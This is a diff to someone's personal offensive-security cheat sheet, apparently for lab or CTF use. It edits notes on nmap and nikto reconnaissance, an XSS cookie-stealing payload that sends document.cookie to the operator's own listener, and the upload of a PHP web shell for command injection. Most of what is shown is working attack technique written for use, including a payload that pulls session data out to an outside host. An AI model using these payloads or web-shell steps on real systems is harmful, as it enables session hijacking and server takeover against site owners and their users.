@@ -40,7 +40,7 @@ can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)
 nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip
 
 ========================================== COOKIE STEALING ===========================================
-<script>document.location="<http://your opstation ip:8000/>"+document.cookie;</script>
+<script>document.location="http://your opstation ip:8000/"+document.cookie;</script>
 run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured
 
 cookie stealer file (CookieSteal.php)
@@ -70,6 +70,7 @@ if($_GET['cmd']) {
 </BODY></HTML>
 
 to use this file also upload it to the vulnerable website to gain a basic shell on the box through the website
+make sure to create an uploads directory in your lin ops for some reason
 
 use the webshell to get cmd injection which means you can run any command using ; <cmd to run>
 to gain access to the box using webshell: use whoami to see who you are then get your home directory
